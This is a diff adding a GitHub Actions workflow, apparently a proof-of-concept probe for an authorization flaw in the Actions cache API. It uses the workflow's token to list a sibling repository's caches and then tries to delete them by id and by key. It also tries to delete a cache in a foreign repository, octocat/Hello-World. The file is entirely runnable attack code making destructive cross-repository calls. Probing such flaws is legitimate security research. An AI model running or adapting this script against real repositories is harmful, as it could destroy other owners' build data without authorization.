@@ -1,0 +1,41 @@
+name: cache-idor-write
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+  actions: write
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Try delete / restore sibling public cache
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          set -euo pipefail
+          # List to get cache id
+          curl -sS -H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" \
+            "https://api.github.com/repos/sujit-jaunjal/app-authz-public/actions/caches" | tee /tmp/caches.json
+          CID=$(python3 -c 'import json;d=json.load(open("/tmp/caches.json"));print(d["actions_caches"][0]["id"] if d.get("actions_caches") else "")')
+          KEY=$(python3 -c 'import json;d=json.load(open("/tmp/caches.json"));print(d["actions_caches"][0]["key"] if d.get("actions_caches") else "")')
+          echo "CID=$CID KEY=$KEY"
+
+          echo "==== DELETE sibling cache by id ===="
+          code=$(curl -sS -o /tmp/del.json -w "%{http_code}" -X DELETE \
+            -H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" \
+            "https://api.github.com/repos/sujit-jaunjal/app-authz-public/actions/caches/$CID")
+          echo "DELETE by id HTTP $code $(cat /tmp/del.json | head -c 200)"
+
+          echo "==== DELETE sibling cache by key ===="
+          # re-seed may be needed if first delete worked — try key delete on Hello-World empty or public key
+          code=$(curl -sS -o /tmp/del2.json -w "%{http_code}" -X DELETE \
+            -H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" \
+            --get "https://api.github.com/repos/sujit-jaunjal/app-authz-public/actions/caches" \
+            --data-urlencode "key=sibling-idor-key-UNIQUE-v2")
+          echo "DELETE by key HTTP $code $(cat /tmp/del2.json | head -c 200)"
+
+          echo "==== foreign public delete attempt octocat ===="
+          code=$(curl -sS -o /tmp/del3.json -w "%{http_code}" -X DELETE \
+            -H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" \
+            "https://api.github.com/repos/octocat/Hello-World/actions/caches/1")
+          echo "DELETE foreign HTTP $code $(cat /tmp/del3.json | head -c 200)"
